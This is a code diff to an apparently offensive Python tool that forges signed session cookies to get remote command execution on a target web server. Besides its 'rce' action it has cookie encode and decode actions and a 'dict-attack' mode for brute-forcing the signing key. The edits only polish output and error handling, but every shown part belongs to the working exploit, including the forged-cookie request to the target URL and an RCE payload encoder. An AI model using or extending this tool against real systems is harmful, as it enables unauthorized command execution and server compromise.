@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 import argparse
 import base64
 import hmac
@@ -26,8 +27,8 @@ class RCE:
             try:
                 if cookie_name:
                     cookies = {cookie_name: forged_cookie.decode()}
-                requests.get(url, cookies=cookies, timeout=3)
-                console.print(f"[bold][green]Request sent with forged cookie:[/green][/bold]")
+                resp = requests.get(url, cookies=cookies, timeout=3)
+                console.print(f"[bold blue]Request sent with forged cookie ==> [/bold blue] [bold green]Status_Code: ({resp.status_code})[/bold green]")
             except requests.Timeout:
                 console.print("[bold red]Error:[/bold red] Request timed out")
                 exit(1)
@@ -136,7 +137,7 @@ def main():
         if decoded_cookie is not None:
             console.print(f"[bold][blue]Decoded cookie:[/blue][green] {decoded_cookie}[/green][/bold]")
         else:
-            console.print(f"[bold red][!] Failed to decode cookie with the provided key.[/ bold red]")
+            console.print(f"[bold red][!] Failed to decode cookie with the provided key.[/bold red]")
     elif args.action == 'encode':
         data = eval(args.cookie)
         encoded_cookie = encoder_decoder.encode(data)
@@ -144,14 +145,25 @@ def main():
     elif args.action == 'rce':
         if not args.cmd:
             parser.error('--cmd is required for rce action')
-        
+
         rce_instance = RCE(args.cmd)
         # Convert the cookie string to a tuple and get the first element (Cookie Key)
-        cookie_name = eval(args.cookie)[0]
+        try:
+            cookie_tuple = eval(args.cookie)
+            if isinstance(cookie_tuple, tuple):
+                cookie_name = cookie_tuple[0]
+            else:
+                raise ValueError("Cookie should be a tuple.")
+        except (SyntaxError, ValueError) as e:
+            console.print(f"[bold red]Error processing cookie: {e}[/bold red]")
+            exit(1)
+        
+        # Execute the command and forge the cookie
         rce_instance.forge_cookie_and_send_request(args.key, args.url, cookie_name)
         
+        # Print the encoded RCE cookie
         encoded_cookie = encoder_decoder.encode_rce(args.cmd)
-        console.print(f"[bold green]{encoded_cookie.decode()}[/bold green]")
+        console.print(f"[bold][blue]Encoded RCE cookie:[/blue] [green]{encoded_cookie.decode()}[/green][/bold]")
     elif args.action == 'dict-attack':
         if not args.wordlist:
             parser.error('--wordlist is required for dict-attack action')
